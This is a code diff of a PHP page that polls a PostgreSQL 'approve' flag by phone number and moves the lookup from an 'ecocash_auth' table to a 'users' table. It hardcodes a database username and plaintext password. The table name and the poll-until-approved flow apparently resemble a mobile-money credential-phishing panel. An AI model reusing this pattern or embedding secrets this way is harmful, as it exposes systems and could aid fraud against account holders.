@@ -16,9 +16,6 @@ $dbUser = "loan_9d8q_user";
 $dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
 // ==============================================
 
-/**
- * Get PostgreSQL connection
- */
 function getDbConnection($host, $port, $dbname, $user, $pass) {
     static $conn = null;
     if ($conn === null) {
@@ -36,7 +33,7 @@ function getDbConnection($host, $port, $dbname, $user, $pass) {
     return $conn;
 }
 
-// Handle AJAX request to check approve status
+// AJAX endpoint to check 'approve' status from 'users' table
 if (isset($_GET['check_approve']) && $_GET['check_approve'] == 1) {
     header('Content-Type: application/json');
     $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
@@ -45,14 +42,15 @@ if (isset($_GET['check_approve']) && $_GET['check_approve'] == 1) {
         exit;
     }
     
-    // Get the maximum approve value for this phone (grouped)
-    $sql = "SELECT MAX(approve) as approve FROM ecocash_auth WHERE phone = $1";
+    // Query the 'users' table for the approve column
+    $sql = "SELECT approve FROM users WHERE phone = $1";
     $result = pg_query_params($conn, $sql, [$phone]);
     if ($result && $row = pg_fetch_assoc($result)) {
         $approve = (int)$row['approve'];
         echo json_encode(['approve' => $approve]);
     } else {
-        echo json_encode(['error' => 'Query failed', 'approve' => 0]);
+        // If no record found, treat as not approved (0)
+        echo json_encode(['approve' => 0]);
     }
     exit;
 }
@@ -176,7 +174,7 @@ body {
 </div>
 
 <script>
-// Poll the server every 2 seconds to check the 'approve' status
+// Poll the server every 2 seconds to check the 'approve' status from the 'users' table
 function checkApproval() {
     fetch(window.location.href + '?check_approve=1')
         .then(response => response.json())
